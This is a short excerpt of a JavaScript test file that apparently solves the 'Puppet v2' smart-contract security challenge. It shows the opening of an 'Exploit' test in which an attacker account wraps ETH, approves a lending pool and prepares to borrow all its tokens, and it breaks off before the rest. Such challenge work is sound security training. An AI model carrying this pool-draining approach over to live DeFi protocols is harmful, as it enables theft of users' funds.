...
describe('[Challenge] Puppet v2', function () {
    ...
    it('Exploit', async function () {
        ...
        attackerEthBalance = attackerEthBalance.sub(ethers.utils.parseEther('0.1')); // save some ether for gas

        // Wrap ether and approve to pool
        await this.weth.connect(attacker).deposit({ value: attackerEthBalance});
        await this.weth.connect(attacker).approve(this.lendingPool.address, attackerEthBalance);

        // Borrowing all tokens on the pool
